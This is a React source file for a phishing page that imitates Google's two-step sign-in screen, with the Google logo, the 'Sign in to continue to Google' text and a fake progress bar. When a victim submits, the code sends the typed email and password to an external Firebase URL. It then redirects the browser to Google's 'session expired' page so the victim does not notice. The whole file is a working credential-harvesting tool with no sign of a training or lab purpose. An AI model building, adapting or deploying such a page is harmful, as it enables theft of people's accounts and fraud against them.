import React, { useState, useEffect } from 'react';
import { LinearProgress, TextField, Paper, Button, FormControlLabel, Checkbox } from '@mui/material'
import glogo from './google.png'
import firebase_url from './uri'

export default function App() {
    const [progreeView, setProgreeView] = useState(false);
    const [realprog, setRealprog] = useState(false);
    const [errorm, setErrorm] = useState({
        error: false,
        helper: ""
    });
    const [type, setType] = useState("mail");
    const [mail, setMail] = useState("");
    const [password, setPassword] = useState("");

    window.addEventListener("keydown", (e) => {
        if (e.key === "Enter") {
            doNext();
        }
    })

    function doNext() {
        if (type === "mail") {
            if (mail.replace(" ", "") === "") {
                setErrorm({
                    error: true,
                    helper: "Enter an email or phone number"
                })
            } else {
                setProgreeView(true)
                setErrorm({
                    error: false,
                    helper: ""
                })
            }
        } else {
            if (password.replace(" ", "") === "") {
                setErrorm({
                    error: true,
                    helper: "Enter a password"
                })
            } else {
                saveData()
            }
        }
    }
    function saveData() {
        setRealprog(true);
        fetch(firebase_url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                mail,
                password
            })
        })
            .then(() => {
                window.location = "https://accounts.google.com/info/sessionexpired?continue=null"
            })
            .catch(e => console.error(e));
    }
    useEffect(() => {
        if (progreeView == true) {
            setTimeout(() => {
                setType("pass");
                setProgreeView(false);
            }, 2000);
        }
    }, [progreeView])
    return (
        <div style={{
            position: 'absolute', left: '50%', top: '50%',
            transform: 'translate(-50%, -50%)'
        }}>{
                progreeView || realprog ? (<LinearProgress style={{
                    marginBottom: -3,
                    borderTopLeftRadius: 4,
                    borderTopRightRadius: 4
                }}
                />) : <></>
            }
            <Paper variant="outlined" style={{
                width: 362,
                textAlign: "center",
                padding: "48px 40px 36px"
            }}>
                <img src={glogo} style={{ width: 75, height: 24, display: "inline-block" }} />
                <br />
                <br />
                <span style={{
                    fontSize: 24,
                    fontFamily: 'sans-serif',
                }}>Sign in</span>
                <br />
                <span style={{
                    marginTop: 8,
                    display: "block",
                    fontSize: 16
                }}>to continue to Google</span>
                <div style={{
                    marginTop: 32,
                    width: "94%",
                    display: "inline-block",
                    textAlign: "left"
                }}>
                    {
                        type === "mail" ? (
                            <TextField id="outlined-basic" label="Email or phone" variant="outlined" style={{
                                width: "100%"
                            }}
                                value={mail}
                                error={errorm.error}
                                helperText={errorm.helper}
                                onChange={(v) => setMail(v.target.value)}
                            />
                        ) : (
                            <TextField id="outlined-basic" label="Enter your password" variant="outlined" style={{
                                width: "100%"
                            }}
                                type="password"
                                value={password}
                                error={errorm.error}
                                helperText={errorm.helper}
                                onChange={(v) => setPassword(v.target.value)}
                            />
                        )
                    }
                    {
                        type === "mail" ? (
                            <>
                                <Button variant="text" style={{
                                    textTransform: "capitalize",
                                    fontWeight: "bold"
                                }}>Forgot email?</Button>
                            </>
                        ) : (
                            <>
                                <FormControlLabel
                                    label="Show password"
                                    control={<Checkbox />}
                                />
                            </>
                        )
                    }
                    <br /><br />
                    {type === "mail" ? (
                        <>
                            <p style={{
                                color: "#5f6368",
                                fontSize: 14,
                                marginLeft: 4
                            }}>Not your computer? Use Guest mode to sign in privately.</p>
                            <Button variant="text" style={{
                                textTransform: "capitalize",
                                fontWeight: "bold"
                            }}>Learn more</Button>
                            <br /><br />
                        </>
                    ) : <></>}
                    {type === "mail" ? (<></>) : (<>
                        <br /><br />
                    </>)}
                    <div style={{
                        // width: "100%",
                        justifyContent: "space-between",
                        display: "flex"
                    }}>
                        {
                            type === "mail" ? (
                                <>
                                    <Button variant="text" style={{
                                        textTransform: "capitalize",
                                        fontWeight: "bold"
                                    }}>Create account</Button>
                                </>
                            ) : (
                                <>
                                    <Button variant="text" style={{
                                        textTransform: "capitalize",
                                        fontWeight: "bold"
                                    }}>Forgot password?</Button>
                                </>
                            )
                        }
                        <Button variant="contained"
                            style={{
                                textTransform: "capitalize"
                            }}
                            onClick={() => doNext()}
                        >Next</Button>
                    </div>
                </div>
                {type === "mail" ? (<></>) : (<>
                    <br /><br /><br />
                    <br /><br /><br />
                </>)}
            </Paper>

        </div>
    )
}
